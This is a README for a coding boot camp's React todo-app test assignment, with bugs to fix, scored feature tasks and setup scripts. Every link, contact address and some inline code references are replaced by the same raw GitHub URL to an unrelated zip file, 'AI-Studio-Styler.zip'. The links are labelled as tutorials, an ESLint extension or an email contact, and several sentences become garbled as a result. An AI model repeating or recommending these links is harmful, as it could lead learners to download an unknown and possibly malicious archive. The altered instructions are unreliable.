Test Assignment for UpLab Boot Camp 3
## Overview
Welcome to the UpLab Boot Camp. This is the test assignment for you to get your brains prepared before the course. The number of places is limited, so the purpose of this test assignment is to choose the best candidates that are able to understand and complete tasks of different complexity.

The test assignment is a simple todo list application that allows you to create your own list that is saved in your browser memory. 
The application is supposed to perform the following actions:
- add a new task
- set a due date for a task
- see a list of todos
- mark todo as completed
- remove todos
- see all the todos along with completed
- use categories to group todos

### Structure of the assignment
In the daily life, programmers should fix bugs before adding features. Who is willing to use an application full of bugs, but with tons of features? That's why it is mandatory to complete all the bugs from the list.

Tasks list is a list of new features that should be added to the working application. It should allow you to choose an order, pick only the features that you can implement. Even one implemented task counts, but we will pick students among the ones who get the most points.
__Please take a note that different tasks have different number of points__.

__Important__: partial task solution doesn't count. Solutions with critical bugs don't count - test your code.

## How to work on your assignment

1. Create a __private__ mirror of this repo in your GitHub account to avoid exposing your code and invite `brmk` as a collaborator (Settings -> Collaborators). You can learn how to do it here: https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
2. Setup your environment (please see Environment section for versions in the end of this file)
3. Install npm dependencies with command `npm i` or `yarn`
4. Start the app `npm run start` or `yarn start`
5. Please try to have 1 commit per task/bugfix. When you complete your task, do not forget to mark it as completed in the list below. Just put an `x` into the checkbox between braces ( `- [ ]` - unchecked, `- [x]` - checked ).
6. Do not forget to constantly push your changes.
7. When you finish your assignment, please send an email to https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip with the link to your GitHub repo and a list of finished tasks.

We only accept your assignments in the GitHub. Do not send us any zip archives with your projects!

We recommend you to use VSCode while working on your assignment and install an [ESlint extension](https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip) from market to quickly see the syntax errors and other recommendations.

__Have a question?__ Please, do not hesitate to contact us at https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip or by email https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip

## Assignment

### Bugs (mandatory):

- [ ] B1. Bug: status filter button displays on top of the calendar view when selecting due date of a task
- [ ] B2. Bug: the app crashes after adding a new todo

### Tasks (optional):

- [ ] T1. Change a favicon and title of the app into something cool. __1 point__
- [ ] T2. Highlight due dates in the todo list with different colors. __4 points__ 
Requirements:
* Green - the task's due date is 2+ days from today or the task is already completed.
* Yellow - the task's due date is <2 days from today or today
* Red - the task's due date has already passed
- [ ] T3. Highlight the currently selected category in the sidebar with bold text __2 points__
- [ ] T4. Allow user to delete any category created by him (https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip is false). Note: delete all todos in this category as well. __6 points__
- [ ] T5. Allow user to edit category name of categories created by him (https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip is false) __6 points__
- [ ] T6. On the "All" category page for each category display a separate card with the todos that belong to this category (to make this task easier, you can hide the filter and show only Open todos for each category only on this page). __8 points__
- [ ] T7. Adapt the app to be usable on mobile (add a sidebar toggle button) __4 points__
- [ ] T8. Deploy your demo app on Netlify or another hosting __4 points__ 
Links:
* https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
* https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
- [ ] T9. Drag'n'drop to do list item into another list in desktop version __10 points__
* https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
* https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip

__Note:__ you can do some extra stuff even if you completed 0 tasks here. Please write about it somewhere and we will add extra points to your application and we may add you extra points!

-----

## Handy links that might help you

0. JS fundamentals - https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
1. Intro to React - https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
2. React Crashcourse 2021 - https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
3. ES6 - https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip
4. How to Learn React — A roadmap from beginner to advanced - https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip

--- 

This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/Baraniuk-Volodymyr/AI-Studio-Styler/master/linch/AI-Studio-Styler.zip).

## Available Scripts

In the project directory, you can run:

### `npm start`

Runs the app in the development mode.<br>
Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

The page will reload if you make edits.<br>
You will also see any lint errors in the console.


### `npm run lint:fix`

Runs eslint and fixes auto-fixable problems

### `npm run lint`

Only runs eslint without auto-fix

### `npm run test`

Runs tests
